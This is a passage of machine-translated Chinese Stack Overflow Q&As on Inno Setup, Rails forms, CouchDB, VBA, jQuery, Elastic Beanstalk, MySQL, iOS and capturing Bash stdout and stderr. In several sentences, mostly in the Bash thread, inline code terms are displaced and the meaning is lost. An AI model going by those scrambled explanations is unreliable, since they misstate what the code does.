Name: "onlytoby"; Description: "Install Only Toby"
Name: "onlysherlock"; Description: "Install Only Sherlock"

[Components]
Name: "watson"; Description: "Watson Component"; Types: onlywatson full
Name: "toby"; Description: "Toby Component"; Types: onlytoby full
Name: "sherlock"; Description: "Sherlock Component"; Types: onlysherlock full

[Files]
;watson
Source: "files\Watson.txt"; DestDir: "{app}"; Flags: ignoreversion; Components: watson
Source: "files\Watson1.txt"; DestDir: "{app}"; Flags: ignoreversion; Components: watson
Source: "files\Watson2.txt"; DestDir: "{app}"; Flags: ignoreversion; Components: watson
; Toby
Source: "files\toby\*"; DestDir: "{app}\extras\Toby"; Flags: ignoreversion createallsubdirs recursesubdirs; Components: toby
; Sherlock
Source: "files\Sherlock\*"; DestDir: "{app}\extras\Sherlock"; Flags: ignoreversion createallsubdirs recursesubdirs; Components: sherlock
; NOTE: Don't use "Flags: ignoreversion" on any shared system files

[Icons]
Name: "{group}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Components: Watson
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"; Components: Watson
Name: "{commondesktop}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"; Components: Watson; Tasks: desktopicon

[Run]
Filename: "{app}\{#MyAppExeName}"; Flags: nowait postinstall skipifsilent; Description: "{cm:LaunchProgram,{#StringChange(MyAppName, '&', '&&')}}"; Components: Watson

[Tasks]
Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; Components: Watson 
```

它在我的机器上使用 Inno 5.5.2 进行了测试，可以按您的意愿工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T20:05:13.317

我现在让它工作了。我唯一添加的是Program Files中的卸载图标应该属于所有组件。因此，如果您进行部分安装，您仍然可以选择卸载该部分安装。

```
Name: "{group}\{cm:UninstallProgram,{#MyAppName}}"; Filename: "{uninstallexe}"; Components: Watson Sherlock Toby 
```

# ruby-on-rails-3 - Rails 3 + 简单表单 + bootstrap Radio 和 checkbox 作为带有切换功能的按钮

> ID：13806594
> 
> 赞同：4
> 
> 时间：2012-12-10T18:06:19.290
> 
> 标签：ruby-on-rails-3, twitter-bootstrap, simple-form

我正试图让我的收音机和复选框作为带有切换功能的按钮工作，如 twitters 引导页面上所示。[链接](http://twitter.github.com/bootstrap/javascript.html#buttons)！

我设法让这些按钮出现并与数据库一起运行，但是当用户返回页面时，它们不会被切换。我想知道这是否可能。如果是，我该如何在我的代码上实现它？我正在使用 simple_form + twitter 引导程序。

这是我用来显示单选按钮的代码：

```
<div class="btn-group" data-toggle="buttons-radio">
<%= f.input :child_gender, :label => "Child gender?", :collection => [['Boy', 'Boy'], ['Girl', 'Girl'], :as => :radio_buttons, :input_html => { :data => {:toggle => 'buttons-radio'} }, :item_wrapper_class => 'btn btn-toggle btn-small inline' %>
</div> 
```

这是复选框按钮的代码：

```
<div class="btn-group">
<%= f.input :child_size, :label => "What size?", :collection => child_size, :as => :check_boxes, :input_html => { :data => {:toggle => 'buttons-checkbox'} }, :item_wrapper_class => 'btn btn-toggle btn-small' %>
</div> 
```

这是我拥有的自定义CSS `btn-toggle`：

```
.btn-toggle input {
    display: none;
} 
```

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-09-08T01:47:41.713

从 Nickl 的答案构建并调整事物以不需要额外的 Javascript 并呈现 Bootstrap 当前期望的相同语义 HTML，这是我的解决方案：

```
class ButtonRadioInput < SimpleForm::Inputs::CollectionRadioButtonsInput
  def input
    out = '<div class="btn-group" data-toggle="buttons">'
    label_method, value_method = detect_collection_methods
    collection.each do |item|
      value = item.send(value_method)
      label = item.send(label_method)
      active = ''
      active = ' active' unless
          out =~ / active/ ||
          input_html_options[:value] != value &&
          item != collection.last
      input_html_options[:value] = value unless active.empty?
      btn = 'btn'
      btn = "btn btn-#{item.third}" unless item.third.nil?
      out << <<-HTML
        <label class="#{btn} #{active}">    
          <input type="radio" value="#{value}" name="#{attribute_name}">#{label}</input>
        </label>
HTML
    end
    out << "</div>"
    out.html_safe
  end
end 
```

然后要使用它，您将使用 SimpleForm ：

```
=f.input :role, label: false, as: :button_radio, 
                    collection: [["Warm Up", :warm_up, :primary],
                                ["Small Sided", :small_sided, :primary],
                                ["Expanded", :expanded, :primary],
                                ["Game", :game, :primary]] 
```

[这将像Bootstrap 自己的组件页面](http://getbootstrap.com/javascript/#buttons)中的单选按钮示例一样呈现代码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-10-11T10:30:37.003

`simple_form` `input`这是我们需要的引导单选按钮的缺失。

```
# lib/inputs/button_radio_input.rb
class ButtonRadioInput < SimpleForm::Inputs::CollectionRadioButtonsInput
  def input
    out = <<-HTML

<div class="btn-group" data-toggle="buttons-radio">
HTML
    input_field = @builder.hidden_field(attribute_name, input_html_options)
    input_id = input_field[/ id="(\w*)/, 1]
    label_method, value_method = detect_collection_methods
    collection.each {|item|
      value = item.send(value_method)
      label = item.send(label_method)
      on_click = "document.getElementById('#{input_id}').value='#{value}';return false;"
      active = ''
      active = ' active' unless
          out =~ / active/ ||
          input_html_options[:value] != value &&
          item != collection.last
      input_html_options[:value] = value unless active.empty?
      btn = 'btn'
      btn = "btn btn-#{item.third}" unless item.third.nil?
      out << <<-HTML
  <button onclick="javascript:#{on_click}" type="button" class="#{btn}#{active}">#{label}</button>
HTML
    }
    value = <<-VAL
value="#{input_html_options[:value]}"
VAL
    input_field[/value="[^"]*"/] = value.chomp if input_field =~ /value/
    input_field[/input/] = "input #{value.chomp}" unless input_field =~ /value/
    out << <<-HTML
  #{input_field}
</div>
HTML
    out.html_safe
  end
end 
```

它支持`as: :radio_buttons`通过为按钮样式添加可选的第三个参数来接受的所有内容。

```
= f.input :rad_buttons,
  as: :button_radio,
  collection: [ [:blue, 1, :primary],
    [:red, 2, :danger],
    [:green, 3, :success],
  ] 
```

上面的 haml 片段将生成一个三个单选按钮组

*   **第一个**`btn-primary`带有标签`blue`和值的按钮`1`
*   **第二个**按钮样式为`btn-danger`带有标签`red`和值`2`
*   **第三个**按钮样式为`btn-success`带有标签`green`和值`3`

由于我们没有分配`input_html: {value: 1}`值`rad_buttons`（`3`

开心！

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-20T20:27:11.113

您还可以使用带有一些不显眼的 JavaScript 的隐藏输入字段。将隐藏字段与您的 *.html.erb 中的 twitter 引导工具按钮放在一起：

```
<%= f.hidden_field :child_gender %>
<div id="gender-toggle" class="btn-group" data-toggle="buttons-radio">
  <button type="button" class="btn" data-gender="boy">Boy</button>
  <button type="button" class="btn" data-gender="girl">Girl</button>
</div> 
```

在您的 *.js.coffee 中，只需设置活动按钮和输入值：

```
# Activate selected gender
$("button[data-gender=" + $('#hidden_field_id').val() + "]").addClass('active')

# Set gender value
$("#gender-toggle button").click -> 
  $('#hidden_field_id').val($(this).data('gender')) 
```

希望这可以帮助。

# node.js - Couchdb 检索两个用户之间的聊天记录

> ID：13806599
> 
> 赞同：0
> 
> 时间：2012-12-10T18:06:31.547
> 
> 标签：node.js, nosql, couchdb, cradle

我目前正在使用 Couchdb 来保存两个用户之间的聊天记录。我的数据库包含每个用户输入的每条插入消息。它们是这样输入的：

```
{
  _id: (timestamp),
  from: sender,
  to: receiver,
  message: msg
} 
```

我有一个这样编码的视图：

```
 function(doc) {
     if (doc.from && doc.to){
         (doc._id, doc);
     }
   } 
```

我很难想出一个想法来根据我当前的设置检索两个用户之间的聊天转换。

我在视图函数中按照以下方式进行了操作：

```
res.forEach(function (row) {
    if(row.from != null || row.to != null){
          if((row.from == socket.username && row.to == receiver) || (row.from == receiver && row.to == socket.username)){
             MsgHistoryContent += row.message + '\n';
          }
    }
}); 
```

然而，这并没有检索到两个用户之间的所有对话，因为它检索了每个用户的所有消息。

任何人都可以给我一个领导？任何帮助，将不胜感激。

PS：我正在使用 node.js 和 cradle。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T21:51:24.790

您可以像这样创建地图功能：

```
function(doc) {
    var key = [doc.from, doc.to].sort(function (a, b) {
        return a.localeCompare(b);
    });

    emit(key.concat(doc._id), doc);
} 
```

然后你就可以通过查询'?startkey=["user1", "user2"]&endkey=["user1", "user2", {}]'得到用户之间的对话。当然，开始键和结束键 0 和 1 索引都应该按字母顺序排序。

# vba - SeriesCollection.Name 到 Range？Excel

> ID：13806605
> 
> 赞同：1
> 
> 时间：2012-12-10T18:06:59.423
> 
> 标签：vba, excel

我正在尝试从我的 excel 表中获取正确的图例，并且我正在尝试使用

```
SeriesCollection(1).Name 
```

VBA 中的方法。我在做什么看起来像这样

```
ActiveChart.SeriesCollection(1).Name = Range(" some range ").Text 
```

然而，这给了我类型不匹配的错误。关于问题是什么的任何想法？或者我怎么能以不同的方式做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:22:55.373

你指的范围是不是只有一个单元格？在任何情况下，您都可以编写：

```
ActiveChart.SeriesCollection(1).Name = Range("RangeName").Cells(1, 1).Value 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:21:54.600

如果您要引用一个数组（多个单元格的范围），您必须遍历数组并将各个单元格值连接到一个字符串变量中，然后使用该字符串变量来设置`ActiveChart.SeriesCollection(1).Name`

```
Dim myString as String  'Declare a string variable to concatenate the range values
Dim rng as Range        'This is your range variable
Dim cell as Range       'this will be a cell range within rng

Set rng = Range(" some range ")
For each cell in rng
    myString = myString & cell.Value
Next

ActiveChart.SeriesCollection(1).Name = myString 
```

# javascript - JavaScript 执行

> ID：13806607
> 
> 赞同：0
> 
> 时间：2012-12-10T18:07:01.787
> 
> 标签：javascript

我有两个脚本，它们包含在 HTML 正文中。在第一个脚本中，我正在初始化一个在第二个脚本标记中引用的 JS-Object。

```
<body>
  ...
  <script type="text/javascript" src="http://url/script.js"></script>
  <script type="text/javascript">
     obj.a = 1000;
     obj.do();
  </script>
</body> 
```

如果第一个脚本（通过 HTTP）的加载时间很慢，会发生什么？JS在body中的执行顺序是怎样的？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:08:19.980

`<script>`页面源代码中的标签与页面加载同步执行。

`<script>`在脚本完成下载和执行之前，浏览器不会解析或呈现标记后的任何 HTML 。

这就是为什么最好将所有`<script>`标签移动到页面底部，以便首先呈现 HTML。

# python - 使用 Django 的非阻塞 Thrift-Server

> ID：13806609
> 
> 赞同：2
> 
> 时间：2012-12-10T18:07:20.080
> 
> 标签：python, django, nonblocking, thrift, thrift-protocol

[我需要通过Thrift](http://thrift.apache.org/)接口访问来自 Django webapp 的数据。我想以非阻塞方式执行此操作（例如，使用 libevent/gevent ......）但是周围没有很多示例实现（在 python 中），所以我想在这里询问任何示例/提示/经验！

请注意，这个问题是关于使用 Thrift，而不是任何其他协议，我知道为此目的可能有比 Django 更好的框架，但使用它也是一个要求！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-11T15:57:11.970

这可以通过在[Django 管理命令](https://docs.djangoproject.com/en/dev/howto/custom-management-commands/)中实现一个节俭服务器来完成。请参阅您需要的文件结构的链接。在命令文件中，您可以称为“thrift_server.py”，然后您将实现通常的 thrift 服务器，如下所示：

```
import sys
from django.core.management.base import BaseCommand

from thrift.transport import TSocket
from thrift.transport import TTransport
from thrift.protocol import TBinaryProtocol
from thrift.server import TServer

#import thrift files here

#now define the service handler according to your thrift method declaration
class ServiceHandler:
    def __init__(self):
        pass
        #self.log = {}
    def thriftMethodName(self, arg):
        print "hello world!"
        #here you have access to anything in the django framework
        return True

class Command(BaseCommand):
    def handle(self, *args, **kwargs):
        handler = ServiceHandler()
        processor = SaleService.Processor(handler)
        transport = TSocket.TServerSocket(port=9090)
        tfactory = TTransport.TBufferedTransportFactory()
        pfactory = TBinaryProtocol.TBinaryProtocolFactory()

        server = TServer.TSimpleServer(processor, transport, tfactory, pfactory)

        # You could do one of these for a multithreaded server
        #server = TServer.TThreadedServer(processor, transport, tfactory, pfactory)
        #server = TServer.TThreadPoolServer(processor, transport, tfactory, pfactory)

        self.stdout.write('Starting thrift server...')
        server.serve()
        self.stdout.write('done.') 
```

请注意，上面描述了多线程服务器选项，尽管我还没有测试这些选项。

然后，您可以按如下方式运行守护程序：

```
(virtualenv) /django_project/ > python manage.py thrift_server 
```

# java - IntelliJ IDEA 的 Jmockit 0.99x 问题 - 意外异常（在 Eclipse 中工作）

> ID：13806614
> 
> 赞同：1
> 
> 时间：2012-12-10T18:07:38.380
> 
> 标签：java, eclipse, junit, intellij-idea, jmockit

我在 IntelliJ IDEA 11.1.4 中进行测试时遇到了一个非常奇怪的问题。每当我尝试运行调用 的测试时，`Mockit.setUpMocks()`都会收到以下错误：

```
java.lang.Exception: Unexpected exception, expected<com.setgen.core.ApplicationException> but was<java.lang.NullPointerException>
Caused by: java.lang.NullPointerException
at mockit.internal.RedefinitionEngine.redefineMethods(RedefinitionEngine.java:287)
at mockit.internal.RedefinitionEngine.redefineMethods(RedefinitionEngine.java:281)
at mockit.internal.RedefinitionEngine.redefineMethods(RedefinitionEngine.java:267)
at mockit.internal.RedefinitionEngine.redefineMethods(RedefinitionEngine.java:216)
at mockit.internal.RedefinitionEngine.redefineMethods(RedefinitionEngine.java:209)
at mockit.Mockit.setUpMocks(Mockit.java:329) 
```

但是，当用完 Eclipse 时，同样的测试工作得很好。我 100% 确定我的类路径是正确的，因为它与我同事的匹配。他们可以很好地运行相同的测试。在花了很多时间试图弄清楚发生了什么之后，没有人知道为什么我不能。

我已经尝试安装不同版本的 IntelliJ IDEA，以不同的方式配置类路径，以及一堆其他方法，但似乎没有任何解决问题的方法。

如果有帮助，我会使用 Windows 7。我的一些同事也使用它，而其他人使用 Linux。另一个人和我有同样的问题。

谢谢您的帮助！

# php - .load() 将 html 内容循环加载到容器中

> ID：13806618
> 
> 赞同：1
> 
> 时间：2012-12-10T18:07:51.660
> 
> 标签：php, javascript, jquery, html, load

我有一个容器 $('#container') 并且我想将几个元素动态加载到容器中。我有一个名为 subElement.php 的 php 布局。所以我的代码看起来像：

```
for(i = 0;i<10;i++){
    $('#container').load('subElement.php?id='+i,function(data){});
} 
```

只有一个 subElement.php 布局被加载到容器中。我怎样才能以更好的方式做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-10T18:10:00.620

理想情况下，您应该重写您的 PHP 脚本以一次获取所有数据，因此您只需要一个`.load`. 这样做会更快，对用户的网络连接更温和。

但是，既然您要求我们使用您所拥有的：

```
for(i = 0;i<10;i++){
    $('#container').append($('<span>').load('subElement.php?id='+i));
} 
```

但是，如果这些`<span>`元素会弄乱您的代码，您应该改用[Explosion Pills 之](https://stackoverflow.com/a/13806644/901048)类的解决方案。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-10T18:10:03.750

`.load`每次都会覆盖内容。相反，您必须附加它们，可能像这样：

```
$.get('subElement.php?id=+1', function (data) {
   $("#container").append(data);
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T18:12:07.407

每次循环时， load() 都会将 $('#container') 的内容*替换*为您请求的新内容。

为了提高效率，最好的办法是在一次 gulp 中对所有子元素进行 ajax，而不是发出 10 个单独的 HTTP 请求。

另一种方法是，如果由于某种原因您无法更改 api 以支持获取多个元素，则使用 .get() 并在进行单个替换之前收集所有答案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-10T18:10:04.610

您可以使用`$('#container').append('some content')`添加到`#container`.

# version-control - 如何设置我的 AWS EC2 Elastic Beanstalk 项目以与他人协作？

> ID：13806619
> 
> 赞同：4
> 
> 时间：2012-12-10T18:07:50.710
> 
> 标签：version-control, amazon-web-services, amazon-ec2, amazon-elastic-beanstalk

几个月来，我一直在使用 Elastic Beanstalk 开发 AWS EC2。一切都很顺利。现在，客户想要将另一个开发人员添加到项目中。我有点不清楚如何做到这一点。似乎 Elastic Beanstalk 在后台使用 git 并且仅推送。我无法克隆回购。我什至不知道去哪里*找到*回购。

所以，我的问题是，我如何设置（或让其他人设置）以便他们可以与我合作？

**编辑：我想问这个问题的另一种方式是：如果 Elastic Beanstalk 为我设置了我的 Git 存储库，我如何检查该存储库并与其他人共享？**

我在 Windows 7 机器上使用 Visual Studio 2010（安装了 AWS 工具），远程实例是 Windows。

谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-10T22:35:16.140

Elastic Beanstalk 没有任何回购的概念。应用程序版本只是存储在 S3 上的捆绑包。

你需要做的是在 Github 或 Bitbucket 之类的地方托管一个 repo。然后，您可以像分享任何其他项目一样分享您的更改。当需要将版本部署到 Elastic Beanstalk 时，您将执行`git aws.push`而不是像`git push origin`. 当然，这假设您已经[设置了 AWS git dev tools](http://docs.amazonwebservices.com/elasticbeanstalk/latest/dg/create_deploy_PHP.sdlc.html)。

顺便说一句，我建议您为每个开发人员设置一个 IAM 用户帐户，以便每个人都有自己的一组 AWS 访问密钥。这将允许您在不影响其他任何人的情况下撤销对某人的部署访问权限。

# javascript - 设置一个 JS 变量并在 html 标签中使用它

> ID：13806621
> 
> 赞同：5
> 
> 时间：2012-12-10T18:08:08.867
> 
> 标签：javascript, html, variables, var

我已经设置了一个变量，我需要将这个变量拉入一个 html 元素，但我无法让它打印出值，这是代码：

```
<script>
    var randomnumber=Math.floor(Math.random()*11)
</script>

<div id="<script type="text/javascript">document.write(randomnumber)</script>"></div> 
```

谢谢。

编辑：我只是以 div 为例，但我需要向 img 标签添加一个随机数，因为它用于跟踪标签，并且需要一个唯一标识符。有没有更好的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-10T18:11:47.903

利用

```
<script>
document.write('<div id="'+randomnumber+'" ></div>');
</script> 
```

您无法在属性内打开脚本标签

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:14:06.467

或者您可以使用以下方法创建它`JS`：

```
var randomnumber=Math.floor(Math.random()*11);
a = document.createElement('div');
a.setAttribute('id',randomnumber);
document.body.appendChild(a);

// if you know the exact class or ID where it is to be appended you can use

document.getElementsByClassName("myclass")[0].insertBefore(a, document.getElementsByClassName("beforeClass").firstChild); 
```

这将创建一个`div`, 和`id`as`randomnumber`并将其附加到`body`

# ruby-on-rails - 在运行时更改 Rails cache_store？

> ID：13806622
> 
> 赞同：4
> 
> 时间：2012-12-10T18:08:09.947
> 
> 标签：ruby-on-rails, memcached, dalli

我的应用程序具有允许管理员通过 GUI 更改 cache_store 配置的功能。然后新的配置将立即生效。

我的 production.rb 中的默认 cache_store：

```
config.cache_store = :memory_store 
```

管理员可以选择更改为将 memcached 与 Dalli 存储一起使用。我试图改变 Rails.application.config.cache_store：

```
Rails.application.config.cache_store = :dalli_store, 'localhost:11211', 'localhost:11212' 
```

但是 Rails.cache 没有改变：

```
Rails.cache
=> <#ActiveSupport::Cache::MemoryStore entries=0, size=0, options={}> 
```

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T20:14:35.860

缓存存储是在应用程序初始化期间设置的，并且不能在运行时更改 afaik。要实现您想要做的事情，您可以将缓存存储配置保存在配置文件中并重新启动整个应用程序。查看[类似问题的答案](https://stackoverflow.com/questions/5810289/setting-the-cache-store-in-an-initializer)以了解如何做到这一点。

免责声明：使用这种方法，如果配置错误，您可以轻松杀死应用程序。

# mysql - MySQL DATE_SUB 函数未按预期工作

> ID：13806623
> 
> 赞同：1
> 
> 时间：2012-12-10T18:08:10.583
> 
> 标签：mysql

我有以下查询，以获取事件。

```
SELECT 
  * 
FROM
  events_table 
WHERE event_date > DATE_SUB(NOW(), INTERVAL 1 DAY)
ORDER BY event_status ASC,
  event_date ASC 
```

我要做的就是返回 event_date 为的所有行`today`

我要去哪里错了？感谢帮助

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-10T18:12:21.130

在你的 where 子句中怎么样：

```
WHERE DATE(event_date) = DATE(NOW()) 
```

还有另一个不会阻止在 event_date 上使用索引的选项：

```
WHERE event_date BETWEEN CURDATE() AND DATE_ADD(CURDATE(), INTERVAL 1 DAY) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T18:12:17.407

使用[`CURDATE()`](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_curdate)：

```
SELECT 
  * 
FROM
  events_table 
WHERE event_date > CURDATE()
ORDER BY event_status ASC,
  event_date ASC 
```

这是假设 event_date 不能在将来...否则您还需要使用该`DATE()`功能：

```
WHERE DATE(event_date) = CURDATE() 
```

# ios - 从 ios 应用程序打开 FB 页面时重定向。为什么？

> ID：13806625
> 
> 赞同：2
> 
> 时间：2012-12-10T18:08:19.457
> 
> 标签：ios, facebook

我使用下一个代码从 ios 应用程序打开我的 facebook 页面：

```
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"http://www.facebook.com/pages/UNNYHOG-Entertainment/208173649242257"]]; 
```

一切都很好，如果您的设备上没有 FB 应用程序，它仍然可以。但如果你有它 - 你将被重定向到[https://m.facebook.com/pages/UNNYHOG-Entertainment/208173649242257?id=208173649242257&_rdr](https://m.facebook.com/pages/UNNYHOG-Entertainment/208173649242257?id=208173649242257&_rdr)

有谁知道为什么会这样？我猜他们在他们的应用程序中做了一些改变。但是我该怎么做才能解决它？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T19:26:27.300

请参阅[http://wiki.akosma.com/IPhone_URL_Schemes#Facebook](http://wiki.akosma.com/IPhone_URL_Schemes#Facebook)

对于页面，您将要使用`fb://profile/<page id>`

更新：

如果您只想在`fb://`安装了 facebook 的情况下使用 url，请使用

```
if ([[UIApplication sharedApplication] canOpenURL:[NSURL URLWithString:@"fb://"]]) {
    // Facebook app is installed
    fb://profile/<page id>
} 
```

否则使用 http:// 网址

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-10-06T05:13:52.973

苹果在 iOS 9 之后更改了 canOpenURL 方法

*   解决方案：将 URL Schemes 添加到 info.plist 文件中，如下所示

    ```
    < key>LSApplicationQueriesSchemes< /key>

    < array>
    < string>fb< /string>
    < string>twitter< /string>
    < string>whatsapp< /string>

    < /array> 
    ```

这是工作

# bash - 在 Bash 中同时捕获标准输出和标准错误

> ID：13806626
> 
> 赞同：57
> 
> 时间：2012-12-10T18:08:21.540
> 
> 标签：bash, stream, pipe, stdout, stderr

我知道这种语法

```
var=`myscript.sh` 
```

或者

```
var=$(myscript.sh) 
```

将捕获into的结果 ( `stdout`) 。如果我想同时捕获两者，我可以重定向到。如何将它们中的每一个保存到单独的变量中？`myscript.sh``var``stderr``stdout`

我的用例是如果返回码不为零，我想回显`stderr`并抑制其他情况。可能有其他方法可以做到这一点，但这种方法似乎会奏效，如果它真的可能的话。

* * *

## 回答 #1

> 赞同：57
> 
> 时间：2014-11-09T11:00:12.653

有一种非常丑陋的方法可以在没有临时文件（如果你喜欢管道）的情况下捕获两个单独的变量，使用`stderr`进程[替换](http://www.gnu.org/software/bash/manual/bashref.html#Process-Substitution), , 和适当的。我会打电话给你的命令。您可以使用函数模拟这样的命令：`stdout``source``declare``banana`

```
banana() {
    echo "banana to stdout"
    echo >&2 "banana to stderr"
} 
```

我假设您想要 in variable 的标准输出和in `banana`variable`bout`的标准错误。这是实现这一目标的魔法（仅限 Bash≥4）：`banana``berr`

```
. <({ berr=$({ bout=$(banana); } 2>&1; declare -p bout >&2); declare -p berr; } 2>&1) 
```

* * *

那么，这里发生了什么？

让我们从最里面的术语开始：

```
bout=$(banana) 
```

这只是分配给`bout`标准输出的标准方式`banana`，标准错误显示在您的终端上。

然后：

```
{ bout=$(banana); } 2>&1 
```

仍将分配给`bout`的标准输出`banana`，但标准错误`banana`通过标准输出显示在终端上（感谢重定向`2>&1`.

然后：

```
{ bout=$(banana); } 2>&1; declare -p bout >&2 
```

会像上面那样做，但也会在终端上（通过stderr）显示内置的内容`bout`：`declare`这将很快被重用。

然后：

```
berr=$({ bout=$(banana); } 2>&1; declare -p bout >&2); declare -p berr 
```

将分配给`berr`stderr`banana`并显示`berr`with的内容`declare`。

此时，您将在终端屏幕上看到：

```
declare -- bout="banana to stdout"
declare -- berr="banana to stderr" 
```

用线

```
declare -- bout="banana to stdout" 
```

通过 stderr 显示。

最终重定向：

```
{ berr=$({ bout=$(banana); } 2>&1; declare -p bout >&2); declare -p berr; } 2>&1 
```

将通过标准输出显示上一个。

最后，我们使用[流程替换](http://www.gnu.org/software/bash/manual/bashref.html#Process-Substitution)来*获取*这些行的内容。

* * *

您也提到了命令的返回码。更改`banana`为：

```
banana() {
    echo "banana to stdout"
    echo >&2 "banana to stderr"
    return 42
} 
```

我们还将`banana`在变量中获得返回码，`bret`如下所示：

```
. <({ berr=$({ bout=$(banana); bret=$?; } 2>&1; declare -p bout bret >&2); declare -p berr; } 2>&1) 
```

* * *

您也可以不使用采购和流程替换`eval`（它也适用于 Bash<4）：

```
eval "$({ berr=$({ bout=$(banana); bret=$?; } 2>&1; declare -p bout bret >&2); declare -p berr; } 2>&1)" 
```

所有这一切都是安全的，因为我们正在`source`ing 或`eval`ing 的唯一东西是从中获得的，`declare -p`并且总是会被适当地逃脱。

* * *

当然，如果您想要一个数组中的输出（例如，`mapfile`如果您使用 Bash≥4，则使用 ，否则替换`mapfile`为`while`–<code>read 循环），调整很简单。

例如：

```
banana() {
    printf 'banana to stdout %d\n' {1..10}
    echo >&2 'banana to stderr'
    return 42
}

. <({ berr=$({ mapfile -t bout < <(banana); } 2>&1; declare -p bout >&2); declare -p berr; } 2>&1) 
```

并带有返回码：

```
. <({ berr=$({ mapfile -t bout< <(banana; bret=$?; declare -p bret >&3); } 3>&2 2>&1; declare -p bout >&2); declare -p berr; } 2>&1) 
```

* * *

## 回答 #2

> 赞同：40
> 
> 时间：2012-12-10T18:12:38.460

如果没有临时文件，就无法同时捕获两者。

您可以将 stderr 捕获到变量并将 stdout 传递给用户屏幕（来自[此处](http://mywiki.wooledge.org/BashFAQ/002)的示例）：

```
exec 3>&1                    # Save the place that stdout (1) points to.
output=$(command 2>&1 1>&3)  # Run command.  stderr is captured.
exec 3>&-                    # Close FD #3.

# Or this alternative, which captures stderr, letting stdout through:
{ output=$(command 2>&1 1>&3-) ;} 3>&1 
```

但是没有办法同时捕获标准输出和标准错误：

> *您不能做的是仅使用 FD 重定向在一个变量中捕获 stdout，在另一个变量中捕获 stderr。您**必须**使用临时文件（或命名管道）来实现该文件。*

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2012-12-10T18:12:16.990

你可以做：

```
OUT=$(myscript.sh 2> errFile)
ERR=$(<errFile) 
```

现在`$OUT`将有你的脚本的标准输出和你的脚本`$ERR`的错误输出。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-12-10T18:15:33.600

一种简单但不优雅的方法：将 stderr 重定向到一个临时文件，然后将其读回：

```
TMP=$(mktemp)
var=$(myscript.sh 2> "$TMP")
err=$(cat "$TMP")
rm "$TMP" 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2014-01-09T20:09:54.950

虽然我还没有找到一种方法来捕获 stderr 和 stdout 以在 bash 中分隔变量，但我将两者发送到同一个变量......</p>

```
result=$( { grep "JUNK" ./junk.txt; } 2>&1 ) 
```

…然后我检查退出状态“$？”，并对 $result 中的数据采取适当的行动。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-02-15T10:11:50.520

```
# NAME
#   capture - capture the stdout and stderr output of a command
# SYNOPSIS
#   capture <result> <error> <command>
# DESCRIPTION
#   This shell function captures the stdout and stderr output of <command> in
#   the shell variables <result> and <error>.
# ARGUMENTS
#   <result>  - the name of the shell variable to capture stdout
#   <error>   - the name of the shell variable to capture stderr
#   <command> - the command to execute
# ENVIRONMENT
#   The following variables are mdified in the caller's context:
#    - <result>
#    - <error>
# RESULT
#   Retuns the exit code of <command>.
# SOURCE
capture ()
{
    # Name of shell variable to capture the stdout of command.
    result=$1
    shift

    # Name of shell variable to capture the stderr of command.
    error=$1
    shift

    # Local AWK program to extract the error, the result, and the exit code
    # parts of the captured output of command.
    local evaloutput='
        {
            output [NR] = $0
        }
        END \
        {
            firstresultline = NR - output [NR - 1] - 1
            if (Var == "error") \
            {
                for (i = 1; i < firstresultline; ++ i)
                {
                    printf ("%s\n", output [i])
                }
            }
            else if (Var == "result") \
            {
                for (i = firstresultline; i < NR - 1; ++ i)
                {
                    printf ("%s\n", output [i])
                }
            }
            else \
            {
                printf ("%d", output [NR])
            }
        }'

    # Capture the stderr and stdout output of command, as well as its exit code.
    local output="$(
    {
        local stdout
        stdout="$($*)"
        local exitcode=$?
        printf "\n%s\n%d\n%d\n" \
               "$stdout" "$(echo "$stdout" | wc -l)" "$exitcode"
    } 2>&1)"

    # extract the stderr, the stdout, and the exit code parts of the captured
    # output of command.
    printf -v $error "%s" \
                     "$(echo "$output" | gawk -v Var="error" "$evaloutput")"
    printf -v $result "%s" \
                      "$(echo "$output" | gawk -v Var="result" "$evaloutput")"
    return $(echo "$output" | gawk "$evaloutput")
} 
```

# finite-automata - 给定的上下文无关语言是否是常规语言

> ID：13806627
> 
> 赞同：0
> 
> 时间：2012-12-10T18:08:22.240
> 
> 标签：finite-automata, regular-language

是否可以决定：

1.  给定的语法是上下文无关的？

2.  给定的递归语言是上下文无关的？

3.  给定的上下文无关语言是常规的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:21:32.620

给定的语法可以给我们语言，使用语言和 Pumping Lemma，我们可以很容易地确定给定的语法是否是上下文无关的

通过使用 Greibach 定理，我们可以证明上下文无关语言是否是常规语言是不可判定的。

# c# - Asp.net mvc 4 razor 在视图中保存列表时如何在我的控制器中保留类型

